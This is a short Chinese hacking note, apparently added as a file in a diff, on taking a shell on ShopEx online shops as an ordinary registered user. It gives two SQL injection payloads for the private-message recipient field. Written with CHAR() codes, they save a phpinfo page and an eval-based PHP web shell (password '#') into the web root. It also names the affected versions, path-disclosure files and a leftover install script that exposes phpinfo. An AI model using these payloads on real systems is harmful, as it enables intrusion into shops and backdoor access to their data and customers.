@@ -1,0 +1,42 @@
+
+shopex前台普通用户拿shell 
+
+1.普通用户的权限
+
+2.一个可读可写可执行的目录
+
+
+ 
+注册后，发送短消息 ，发送
+ 发送给填入：
+ 
+test' union select  CHAR(60, 63, 112, 104, 112, 32, 112, 104, 112, 105, 110, 102, 111, 40, 41, 59, 63, 62) into outfile '/usr/local/apache/htdocs/images/default/yy520.php'  #
+   
+ 其他随意输入
+   
+ 然后你懂的
+
+
+
+以下是我和红尘基友测试的东东
+ 代码换了一下
+
+01.test' union select  CHAR(60, 63, 112, 104, 112, 32, 64, 101, 118, 97, 108, 40, 36, 95, 80, 79, 83, 84, 91, 39, 35, 39, 93, 41, 59, 63, 62) into outfile 'E:/51tz/xx.php'  #
+复制代码密码:#
+ 
+目前成功的站的版本:shopex v4.8.5.55324
+ 测试版本shopex v4.8.5.55326 不成功
+ 
+一些爆路径的东东
+ core/api/shop_api.php
+ core/api/site/2.0/api_b2b_2_0_cat.php
+ core/api/site/2.0/api_b2b_2_0_goodstype.php
+ core/api/site/2.0/api_b2b_2_0_brand.php
+ lpboke老兄的
+ 
+
+Shopex如果install目录没删，下面这个可以看phpinfo
+ http://www.xxxxx.com/install/svinfo.php?phpinfo=true
+ 这个哪的就不知道了
+ 
+
